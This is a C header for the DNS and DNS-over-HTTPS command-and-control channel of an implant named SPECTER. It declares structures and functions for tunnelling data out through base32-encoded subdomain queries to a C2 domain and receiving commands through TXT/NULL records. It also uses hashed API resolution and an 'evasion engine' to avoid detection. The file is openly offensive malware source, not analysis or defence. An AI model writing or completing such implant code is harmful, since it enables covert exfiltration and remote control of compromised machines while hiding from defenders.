/**
 * SPECTER Implant — DNS/DoH Communications Channel Interface
 *
 * Raw DNS queries over UDP (port 53) and DNS-over-HTTPS (DoH) via
 * HTTPS POST with application/dns-message content type.  Data encoded
 * in subdomain labels (outbound) and TXT/NULL records (inbound).
 * All network operations go through the evasion engine.
 */

#ifndef COMMS_DNS_H
#define COMMS_DNS_H

#include "specter.h"
#include "comms.h"
#include "config.h"

/* ------------------------------------------------------------------ */
/*  Constants                                                          */
/* ------------------------------------------------------------------ */

/* DNS wire format limits */
#define DNS_MAX_LABEL_LEN       63      /* Max bytes per label           */
#define DNS_MAX_NAME_LEN        253     /* Max bytes in full domain name */
#define DNS_MAX_PACKET_SIZE     512     /* Standard UDP DNS packet limit */
#define DNS_MAX_TXT_RECORD      255     /* Max bytes in single TXT chunk */
#define DNS_HEADER_SIZE         12      /* DNS header is always 12 bytes */

/* DNS record types */
#define DNS_TYPE_A              1
#define DNS_TYPE_AAAA           28
#define DNS_TYPE_TXT            16
#define DNS_TYPE_CNAME          5
#define DNS_TYPE_NULL           10

/* DNS header flags */
#define DNS_FLAG_QR             0x8000  /* Response flag                 */
#define DNS_FLAG_RD             0x0100  /* Recursion desired             */
#define DNS_FLAG_RA             0x0080  /* Recursion available           */
#define DNS_CLASS_IN            1       /* Internet class                */

/* DNS channel limits */
#define DNS_MAX_C2_DOMAIN       128     /* Max C2 domain length          */
#define DNS_MAX_RESOLVER        256     /* Max DoH resolver URL          */
#define DNS_MAX_FRAGMENTS       64      /* Max reassembly fragments      */
#define DNS_FRAGMENT_DATA_SIZE  110     /* Max data bytes per query      */
#define DNS_RECV_BUF_SIZE       4096    /* Reassembly buffer             */
#define DNS_SESSION_ID_LEN      8       /* Session ID hex chars          */

/* Base32 encoding constants */
#define DNS_BASE32_ALPHABET     "abcdefghijklmnopqrstuvwxyz234567"

/* UDP/Winsock constants not in comms.h */
#define SOCK_DGRAM              2
#define IPPROTO_UDP             17

/* DJB2 hashes for sendto/recvfrom */
#define HASH_SENDTO             0x1B81FA72  /* "sendto"                  */
#define HASH_RECVFROM           0xFF3DF269  /* "recvfrom"                */

/* DoH mode flag */
#define DNS_MODE_UDP            0
#define DNS_MODE_DOH            1

/* ------------------------------------------------------------------ */
/*  Function pointer types for UDP operations                          */
/* ------------------------------------------------------------------ */

typedef int (__attribute__((stdcall)) *fn_sendto)(
    ULONG_PTR s, const char *buf, int len, int flags,
    const SOCKADDR *to, int tolen);

typedef int (__attribute__((stdcall)) *fn_recvfrom)(
    ULONG_PTR s, char *buf, int len, int flags,
    SOCKADDR *from, int *fromlen);

/* ------------------------------------------------------------------ */
/*  DNS resolved API cache                                             */
/* ------------------------------------------------------------------ */

typedef struct _DNS_API {
    /* Inherited from comms for Winsock basics */
    fn_WSAStartup     pWSAStartup;
    fn_socket         pSocket;
    fn_closesocket    pClosesocket;
    fn_getaddrinfo    pGetaddrinfo;
    fn_freeaddrinfo   pFreeaddrinfo;
    /* UDP-specific */
    fn_sendto         pSendto;
    fn_recvfrom       pRecvfrom;
    /* TLS for DoH (borrowed from comms) */
    fn_connect        pConnect;
    fn_send           pSend;
    fn_recv           pRecv;
    fn_AcquireCredentialsHandleA  pAcquireCredentialsHandleA;
    fn_InitializeSecurityContextA pInitializeSecurityContextA;
    fn_DeleteSecurityContext      pDeleteSecurityContext;
    fn_FreeCredentialsHandle      pFreeCredentialsHandle;
    fn_EncryptMessage             pEncryptMessage;
    fn_DecryptMessage             pDecryptMessage;
    fn_QueryContextAttributesA    pQueryContextAttributesA;
    fn_FreeContextBuffer          pFreeContextBuffer;
    fn_ApplyControlToken          pApplyControlToken;
    BOOL resolved;
} DNS_API;

/* ------------------------------------------------------------------ */
/*  Fragment reassembly                                                */
/* ------------------------------------------------------------------ */

typedef struct _DNS_FRAGMENT {
    DWORD  seq;             /* Fragment sequence number               */
    BYTE   data[DNS_FRAGMENT_DATA_SIZE];
    DWORD  data_len;        /* Bytes in this fragment                 */
    BOOL   received;        /* Fragment received flag                 */
} DNS_FRAGMENT;

typedef struct _DNS_REASSEMBLY {
    DNS_FRAGMENT fragments[DNS_MAX_FRAGMENTS];
    DWORD        total_fragments;  /* Expected total (from server)    */
    DWORD        received_count;   /* Fragments received so far       */
    DWORD        msg_id;           /* Message identifier              */
} DNS_REASSEMBLY;

/* ------------------------------------------------------------------ */
/*  DNS_CONTEXT — DNS channel state                                    */
/* ------------------------------------------------------------------ */

typedef struct _DNS_CONTEXT {
    ULONG_PTR      socket;           /* UDP socket handle               */
    SOCKADDR       server_addr;      /* DNS server address               */
    int            server_addr_len;  /* Address length                   */
    char           c2_domain[DNS_MAX_C2_DOMAIN]; /* C2 domain suffix    */
    char           session_id[DNS_SESSION_ID_LEN + 1]; /* Hex session ID*/
    DWORD          txid_counter;     /* Transaction ID counter           */
    DWORD          send_seq;         /* Outbound sequence number         */
    DWORD          prng_state;       /* PRNG for TXID randomization      */

    /* DoH state */
    DWORD          mode;             /* DNS_MODE_UDP or DNS_MODE_DOH     */
    char           doh_resolver[DNS_MAX_RESOLVER]; /* DoH resolver URL  */
    COMMS_CONTEXT  doh_tls;          /* TLS context for DoH              */

    /* Reassembly */
    DNS_REASSEMBLY reassembly;

    /* Buffers */
    BYTE           send_buf[DNS_MAX_PACKET_SIZE];
    BYTE           recv_buf[DNS_RECV_BUF_SIZE];

    /* Resolved APIs */
    DNS_API        api;
    BOOL           wsa_initialized;

    /* Connection state */
    COMMS_STATE    state;

    /* Session key (shared with main comms) */
    BYTE           session_key[32];
    DWORD          msg_seq;
} DNS_CONTEXT;

/* ------------------------------------------------------------------ */
/*  Base32 encoding/decoding                                           */
/* ------------------------------------------------------------------ */

/**
 * Encode binary data to lowercase base32 (RFC 4648, no padding).
 * Returns number of characters written to output (excluding NUL).
 */
DWORD dns_base32_encode(const BYTE *data, DWORD data_len,
                        char *output, DWORD output_len);

/**
 * Decode base32 string back to binary.
 * Returns number of bytes written to output.
 */
DWORD dns_base32_decode(const char *input, DWORD input_len,
                        BYTE *output, DWORD output_len);

/* ------------------------------------------------------------------ */
/*  DNS wire format construction                                       */
/* ------------------------------------------------------------------ */

/**
 * Generate a pseudo-random transaction ID.
 */
WORD dns_generate_txid(DNS_CONTEXT *ctx);

/**
 * Build a DNS query packet for the given domain name and record type.
 * Returns the packet length, or 0 on error.
 */
DWORD dns_build_query(DNS_CONTEXT *ctx, const char *qname,
                      WORD qtype, BYTE *packet, DWORD packet_len);

/**
 * Encode data into a DNS subdomain query name.
 * Format: <base32_chunk>.<seq>.<session_id>.<c2domain>
 * Returns total length of encoded name, or 0 on error.
 */
DWORD dns_encode_subdomain(DNS_CONTEXT *ctx, const BYTE *data,
                           DWORD data_len, DWORD seq,
                           char *output, DWORD output_len);

/**
 * Parse a DNS response and extract data from TXT or NULL records.
 * Returns the number of data bytes extracted, or 0 on error/no data.
 */
DWORD dns_parse_response(const BYTE *packet, DWORD packet_len,
                         BYTE *data_out, DWORD data_out_len);

/* ------------------------------------------------------------------ */
/*  Channel interface                                                  */
/* ------------------------------------------------------------------ */

/**
 * Initialize and connect the DNS channel.
 * Resolves APIs, creates UDP socket, configures C2 domain.
 */
NTSTATUS dns_connect(IMPLANT_CONTEXT *ctx);

/**
 * Send data over the DNS channel.
 * Fragments data into multiple DNS queries if needed.
 */
NTSTATUS dns_send(IMPLANT_CONTEXT *ctx, const BYTE *data, DWORD len);

/**
 * Receive data from the DNS channel.
 * Reassembles fragments from TXT/NULL responses.
 * data_out: output buffer, data_len: in=buffer size, out=bytes received.
 */
NTSTATUS dns_recv(IMPLANT_CONTEXT *ctx, BYTE *data_out, DWORD *data_len);

/**
 * Disconnect the DNS channel, close socket.
 */
NTSTATUS dns_disconnect(IMPLANT_CONTEXT *ctx);

/**
 * Health check: send a minimal A query, verify response.
 */
NTSTATUS dns_health_check(IMPLANT_CONTEXT *ctx);

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
DNS_CONTEXT *dns_get_context(void);
void dns_test_set_prng_seed(DNS_CONTEXT *ctx, DWORD seed);
#endif

#endif /* COMMS_DNS_H */
